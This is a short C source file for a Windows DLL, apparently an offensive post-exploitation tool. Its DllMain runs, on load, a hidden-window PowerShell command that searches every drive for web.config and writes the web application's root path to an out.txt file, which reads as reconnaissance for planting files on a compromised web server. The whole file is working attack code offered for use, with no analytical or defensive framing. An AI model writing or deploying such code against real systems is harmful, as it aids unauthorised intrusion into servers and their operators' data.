/* 
 * Straight to the point script to find the web application root directory 
 * E.g. target --> /content/img/20210128/arrow.jpg
 * Output will be /content/img/20210128/out.txt
 * Out.txt contains the full path of arrow.jpg
 */

#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
        system("powershell -nop -w 1 \"(Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object { $pp=(Get-ChildItem -Path $_ -Filter web.config -Recurse -ErrorAction SilentlyContinue -Force).DirectoryName }; Out-File -FilePath $pp\\out.txt -InputObject $pp -Encoding ASCII -Force -ErrorAction SilentlyContinue\"");
    return TRUE;
}
